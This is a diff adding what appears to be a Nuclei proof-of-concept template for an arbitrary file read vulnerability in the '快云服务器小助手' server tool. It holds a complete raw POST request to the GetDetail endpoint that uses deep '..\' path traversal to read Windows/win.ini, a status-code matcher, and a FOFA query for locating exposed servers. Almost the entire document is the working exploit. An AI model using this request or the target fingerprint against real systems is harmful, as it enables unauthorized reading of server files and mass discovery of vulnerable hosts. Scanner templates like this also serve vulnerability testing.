@@ -1,0 +1,38 @@
+id: poc-ec7vrt31gqr8vprc
+info:
+  name: 快云服务器小助手 getdetail 存在任意文件文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ec7vrt31gqr8vprc'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ec7vrt31gqr8vprc
+    fofa: body="base.css" && body="CodeCk.aspx"
+http:
+- raw:
+  - 'POST /FileMenu/filemana.aspx/GetDetail HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 99
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Content-Type: application/json; charset=utf-8
+
+    X-Requested-With: XMLHttpRequest
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    {"fpath":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows/win.ini"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
